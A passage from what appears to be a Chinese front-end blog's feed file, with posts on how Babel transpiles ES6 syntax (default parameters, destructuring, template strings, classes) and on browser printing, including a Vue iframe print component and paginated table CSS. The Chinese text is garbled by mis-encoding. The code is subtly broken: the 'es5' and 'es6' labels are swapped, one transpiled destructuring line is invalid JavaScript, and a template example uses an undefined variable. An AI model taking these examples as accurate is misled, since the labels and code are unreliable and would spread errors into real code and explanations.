class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">arguments</span>[<span class="number">1</span>] !== <span class="literal">undefined</span> ? <span class="built_in">arguments</span>[<span class="number">1</span>] : <span class="number">12</span>;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-4-è§£æ„"><a href="#2-4-è§£æ„" class="headerlink" title="2.4 è§£æ„"></a>2.4 è§£æ„</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> [a, ,b] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">const</span> &#123; c, d, <span class="attr">e</span>: &#123; f &#125; &#125; = &#123; <span class="attr">c</span>: <span class="number">1</span>, <span class="attr">d</span>: <span class="number">2</span>, <span class="attr">e</span>: &#123; <span class="attr">f</span>: <span class="number">3</span> &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">var</span> _ref = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">a = _ref[<span class="number">0</span>],</span><br><span class="line">b = _ref[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _c$d$e = <span class="keyword">const</span> &#123; c, d, <span class="attr">e</span>: &#123; f &#125; &#125; = &#123; <span class="attr">c</span>: <span class="number">1</span>, <span class="attr">d</span>: <span class="number">2</span>, <span class="attr">e</span>: &#123; <span class="attr">f</span>: <span class="number">3</span> &#125; &#125;,</span><br><span class="line">c = _c$d$e.c,</span><br><span class="line">d = _c$d$e.d,</span><br><span class="line">f = _c$d$e.e.f;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-5-æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#2-5-æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="2.5 æ¨¡æ¿å­—ç¬¦ä¸²"></a>2.5 æ¨¡æ¿å­—ç¬¦ä¸²</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> name = <span class="string">'å°æ˜'</span></span><br><span class="line"><span class="keyword">const</span> time = <span class="string">'today'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b = <span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line"><span class="keyword">const</span> c = <span class="string">`hello <span class="subst">$&#123;name&#125;</span>,</span></span><br><span class="line"><span class="string">how are you <span class="subst">$&#123;today&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'å°æ˜'</span>;</span><br><span class="line"><span class="keyword">var</span> time = <span class="string">'today'</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">"hello "</span>.concat(name);</span><br><span class="line"><span class="keyword">var</span> c = <span class="string">"hello "</span>.concat(name, <span class="string">",\n\thow are you "</span>).concat(today);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-6-Class"><a href="#2-6-Class" class="headerlink" title="2.6 Class"></a>2.6 Class</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Arr</span> </span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>() &#123;</span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push(val) &#123;</span><br><span class="line"><span class="keyword">this</span>.arr.push(val)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVal(index) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.arr[index]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> Arr();</span><br><span class="line">arr.push(<span class="number">1</span>)</span><br><span class="line">arr.getVal()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_classCallCheck</span>(<span class="params">instance, Constructor</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (! (instance <span class="keyword">instanceof</span> Constructor)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Cannot call a class as a function"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_defineProperties</span>(<span class="params">target, props</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123;</span><br><span class="line"><span class="keyword">var</span> descriptor = props[i];</span><br><span class="line">descriptor.enumerable = descriptor.enumerable || <span class="literal">false</span>;</span><br><span class="line">descriptor.configurable = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"value"</span> <span class="keyword">in</span> descriptor) descriptor.writable = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(target, descriptor.key, descriptor);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_createClass</span>(<span class="params">Constructor, protoProps, staticProps</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (protoProps) _defineProperties(Constructor.prototype, protoProps);</span><br><span class="line"><span class="keyword">if</span> (staticProps) _defineProperties(Constructor, staticProps);</span><br><span class="line"><span class="keyword">return</span> Constructor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Arr = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Arr</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">_classCallCheck(<span class="keyword">this</span>, Arr); <span class="comment">// æ£€æŸ¥æ˜¯ä¸æ˜¯class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_createClass(Arr, [&#123;</span><br><span class="line">key: <span class="string">"push"</span>,</span><br><span class="line">value: <span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.arr.push(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">key: <span class="string">"getVal"</span>,</span><br><span class="line">value: <span class="function"><span class="keyword">function</span> <span class="title">getVal</span>(<span class="params">index</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.arr[index];</span><br><span class="line">&#125;</span><br><span class="line">&#125;]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Arr;</span><br><span class="line">&#125; ();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> Arr();</span><br><span class="line">arr.push(<span class="number">1</span>);</span><br><span class="line">arr.getVal();</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-babel-å’Œ-polyfill"><a href="#3-babel-å’Œ-polyfill" class="headerlink" title="3. babel å’Œ polyfill"></a>3. babel å’Œ polyfill</h3><p><em>æœ‰äº†babelï¼Œä¸ºä»€ä¹ˆè¦polyfillï¼Ÿ</em><br>Babelé»˜è®¤åªè½¬æ¢æ–°çš„JSè¯­æ³•ï¼Œè€ŒES6æ–°ç‰¹æ€§åƒPromise, async/awaitï¼Œåˆ™æ˜¯é€šè¿‡<a href="https://github.com/zloirock/core-js" target="_blank" rel="noopener">core-js</a>å®ç°ã€‚</p><p>Promise, aysnc/await, Generator, Set, Map, Proxy</p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://github.com/lukehoban/es6features#readme" target="_blank" rel="noopener">ES6è¯­æ³•</a></li><li><a href="https://www.babeljs.cn/docs/usage" target="_blank" rel="noopener">Babel</a></li><li><a href="https://github.com/zloirock/core-js" target="_blank" rel="noopener">core-js</a></li><li><a href="https://juejin.im/post/5e534b7d6fb9a07cb83e20f2" target="_blank" rel="noopener">ä»æºç çœ‹Babelæ˜¯å¦‚ä½•ç¼–è¯‘Asyncå’ŒGeneratorå‡½æ•°çš„</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ‰“å°</title>
      <link href="/2020/04/15/print/"/>
      <url>/2020/04/15/print/</url>
      <content type="html"><![CDATA[<h3 id="1-æ‰“å°æ¥å£"><a href="#1-æ‰“å°æ¥å£" class="headerlink" title="1. æ‰“å°æ¥å£"></a>1. æ‰“å°æ¥å£</h3><p>å¼¹å‡ºæ‰“å°é¢„è§ˆçš„çª—å£ï¼Œé€šè¿‡é¡µé¢ç”Ÿæˆpdfç”¨äºæ‰“å°é¢„è§ˆ<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.print();</span><br><span class="line"><span class="built_in">document</span>.execCommand(<span class="string">'print'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'beforeprint'</span>, ()=&gt; &#123;</span><br><span class="line">  <span class="built_in">document</span>.body.innerHTML = <span class="string">'æ­£åœ¨æ‰“å°...'</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'afterprint'</span>, ()=&gt; &#123;</span><br><span class="line">  <span class="built_in">document</span>.body.innerHTML = <span class="string">'æ‰“å°å®Œæˆ...'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-æ‰“å°æ ·å¼"><a href="#2-æ‰“å°æ ·å¼" class="headerlink" title="2. æ‰“å°æ ·å¼"></a>2. æ‰“å°æ ·å¼</h3><p>åœ¨linkä¸ŠåŠ ä¸Š<code>media=&quot;print&quot;</code>æ¥æ ‡è¯†è¿™æ˜¯æ‰“å°æœºæ‰ä¼šåº”ç”¨çš„æ ·å¼ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/print.css"</span> <span class="attr">media</span>=<span class="string">"print"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* åª’ä½“æŸ¥è¯¢èƒ½å®ç°åŒæ ·çš„æ•ˆæœ */</span></span><br><span class="line">@<span class="keyword">media</span> print &#123;</span><br><span class="line">  <span class="selector-tag">h1</span> &#123; <span class="attribute">font-size</span>: <span class="number">20px</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-ç»„ä»¶å®ç°"><a href="#3-ç»„ä»¶å®ç°" class="headerlink" title="3. ç»„ä»¶å®ç°"></a>3. ç»„ä»¶å®ç°</h3><p>æ‰“å°ä¼šæŠŠ<code>document</code>ä¸‹æ‰€æœ‰å¯è§å…ƒç´ æ‰“å°å‡ºæ¥ã€‚å¦‚æœå¸Œæœ›é¡µé¢ä¸Šä¸ç›¸å…³çš„ä¸œè¥¿ä¸è¦å‡ºç°åœ¨æ‰“å°ä¸­ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªiframe,æŠŠè¦æ‰“å°çš„domå’Œæ ·å¼è¡¨éƒ½ä¸¢è¿›å»ï¼Œå†è°ƒç”¨iframeçš„æ‰“å°äº‹ä»¶ã€‚å¼•ç”¨ç»„ä»¶<em><code>&lt;print ref=&quot;print&quot;&gt;æ‰“å°å†…å®¹&lt;/print&gt;</code></em>ï¼Œç­‰å†…å®¹åŠ è½½å®Œåï¼Œè°ƒç”¨<em><code>this.$refs.print()</code></em>æ‰“å°ã€‚</p><p>ç»„ä»¶é»˜è®¤çºµå‘æ‰“å°ï¼Œå¦‚æœè¦æ¨ªå‘æ‰“å°ï¼Œè®¾ç½®<code>direction=&quot;landscape&quot;</code>ã€‚</p><p>æ³¨æ„ï¼šå¦‚æœæ‰“å°å†…å®¹æœ‰å¼‚æ­¥è¯·æ±‚çš„å†…å®¹ï¼Œå›¾ç‰‡ï¼Œè¦ç­‰æ‰€æœ‰å†…å®¹éƒ½è¯·æ±‚åï¼Œæ‰èƒ½è°ƒç”¨printæ–¹æ³•ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- print.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: relative"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"printFrame"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"printFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">createIframe</span>(<span class="params">direction</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// addLinkToIframe</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'printFrame'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> iframeDoc = iframe.contentWindow.document;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> linkList = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'link'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> linkNode = <span class="built_in">Array</span>.prototype.slice.call(linkList, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">  linkNode.forEach(<span class="function"><span class="params">link</span> =&gt;</span> iframeDoc.write(link.outerHTML));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="comment">// addStyleToIframe</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> styleList = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'style'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> styleNode = <span class="built_in">Array</span>.prototype.slice.call(styleList, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">  styleNode.forEach(<span class="function"><span class="params">style</span> =&gt;</span> iframeDoc.write(<span class="string">`&lt;style&gt;<span class="subst">$&#123;style.innerHTML&#125;</span>&lt;/style&gt;`</span>));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="comment">// è®¾ç½®æ¨ªå‘çºµå‘æ‰“å°</span></span></span><br><span class="line"><span class="xml">  iframeDoc.write(`<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="undefined">    @media print&#123;</span></span><br><span class="line"><span class="undefined">      @page&#123;</span></span><br><span class="line"><span class="undefined">        size:A4 $&#123;direction&#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">      .printFrame div &#123;</span></span><br><span class="line"><span class="javascript">        width: $&#123;direction === <span class="string">'portrait'</span> ? <span class="string">'1200px'</span> : <span class="string">'950px'</span>&#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="javascript">    &lt;body&gt;<span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="undefined">  `);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> iframe;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">  props: &#123;</span></span><br><span class="line"><span class="undefined">    direction: &#123;</span></span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">'portrait'</span>,</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// æ‰“å°</span></span></span><br><span class="line"><span class="undefined">    print() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> printFrame = <span class="built_in">document</span>.getElementById(<span class="string">'printFrame'</span>).contentWindow;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> str = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'printFrame'</span>)[<span class="number">0</span>].innerHTML;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'printFrame'</span>).contentDocument.documentElement.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].innerHTML = str;</span></span><br><span class="line"><span class="undefined">      printFrame.document.close();</span></span><br><span class="line"><span class="undefined">      printFrame.focus();</span></span><br><span class="line"><span class="javascript">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="undefined">        printFrame.print();</span></span><br><span class="line"><span class="undefined">      &#125;, 300);</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  mounted() &#123;</span></span><br><span class="line"><span class="javascript">    createIframe(<span class="keyword">this</span>.direction);</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.printFrame</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-id">#printFrame</span>&#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  top: -9999px;</span></span><br><span class="line"><span class="undefined">  left: -2000px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-æ‰“å°è¡¨æ ¼"><a href="#4-æ‰“å°è¡¨æ ¼" class="headerlink" title="4. æ‰“å°è¡¨æ ¼"></a>4. æ‰“å°è¡¨æ ¼</h3><p>è¡¨æ ¼å¤ªé•¿çš„æ—¶å€™ï¼Œå®ç°åˆ†é¡µåŠŸèƒ½ï¼Œæ¯ä¸ªåˆ†é¡µéƒ½å¸¦è¡¨å¤´ã€‚ä¸”å¯è‡ªå®šä¹‰é¡µå¤´é¡µå°¾<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"print-table"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>è¡¨å¤´1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>è¡¨å¤´2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>æ¯é¡µé¡µå°¾å†…å®¹<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.print-table</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: table;</span></span><br><span class="line"><span class="undefined">  thead &#123;</span></span><br><span class="line"><span class="undefined">    display: table-header-group;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">  tfoot &#123;</span></span><br><span class="line"><span class="undefined">    display: table-footer-group;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-ç”Ÿæˆæ¡å½¢ç "><a href="#5-ç”Ÿæˆæ¡å½¢ç " class="headerlink" title="5. ç”Ÿæˆæ¡å½¢ç "></a>5. ç”Ÿæˆæ¡å½¢ç </h3><p>ç”¨jsBarCodeç”Ÿæˆæ¡å½¢ç å›¾ç‰‡<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">ref</span>=<span class="string">"barcode"</span> <span class="attr">id</span>=<span class="string">"barcode"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsBarCode <span class="keyword">from</span> <span class="string">'jsbarcode'</span>;</span><br><span class="line"></span><br><span class="line">jsBarCode(<span 